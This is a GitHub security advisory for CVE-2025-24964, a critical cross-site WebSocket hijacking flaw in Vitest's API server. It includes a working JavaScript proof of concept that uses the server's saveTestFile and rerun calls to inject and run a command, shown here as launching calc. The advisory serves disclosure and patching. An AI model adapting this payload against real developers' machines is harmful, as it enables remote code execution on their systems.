# [C] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening

## Summary
Severity: Critical
Advisory: GHSA-9crc-q9x8-hgqq
CVE: CVE-2025-24964
CWE: CWE-1385
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2025-02-04
Source: https://github.com/advisories/GHSA-9crc-q9x8-hgqq
Type: github-advisory

## Affected
- npm: `vitest` — affected >=1.0.0 <1.6.1
- npm: `vitest` — affected >=2.0.0 <2.1.9
- npm: `vitest` — affected >=3.0.0 <3.0.5
- npm: `vitest` — affected >=0

## Details
### Summary
Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.

### Details
When [`api` option](https://vitest.dev/config/#api) is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.
https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46

This WebSocket server has `saveTestFile` API that can edit a test file and `rerun` API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the `saveTestFile` API and then running that file by calling the `rerun` API.
https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76

### PoC
1. Open Vitest UI.
2. Access a malicious web site with the script below.
3. If you have `calc` executable in `PATH` env var (you'll likely have it if you are running on Windows), that application will be executed.

```js
// code from https://github.com/WebReflection/flatted
const Flatted=function(n){"use strict";function t(n){return t="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f="string",i={},c="object",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p<y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&&(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g<m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&&u?y(o,new Set,u,f):u;return f.call({"":i},"",i)},S=function(n,r,o){for(var u=r&&t(r)===c?function(n,t){return""===n||-1<r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({"":n},"",n)),v=!y;y<l.length;)v=!0,s[y]=e(l[y++],S,o);return"["+s.join(",")+"]";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});

// actual code to run
const ws = new WebSocket('ws://localhost:51204/__vitest_api__')
ws.addEventListener('message', e => {
    console.log(e.data)
})
ws.addEventListener('open', () => {
    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: "getFiles", a: [] }))

    const testFilePath = "/path/to/test-file/basic.test.ts" // use a test file returned from the response of "getFiles"

    // edit file content to inject command execution
    ws.send(Flatted.stringify({
      t: 'q',
      i: crypto.randomUUID(),
      m: "saveTestFile",
      a: [testFilePath, "import child_process from 'child_process';child_process.execSync('calc')"]
    }))
    // rerun the tests to run the injected command execution code
    ws.send(Flatted.stringify({
      t: 'q',
      i: crypto.randomUUID(),
      m: "rerun",
      a: [testFilePath]
    }))
})
```

### Impact
This vulnerability can result in remote code execution for users that are using Vitest serve API.

## References
- https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq
- https://nvd.nist.gov/vuln/detail/CVE-2025-24964
- https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc
- https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241
- https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383
- https://github.com/vitest-dev/vitest
- https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46
- https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76
- https://vitest.dev/config/#api
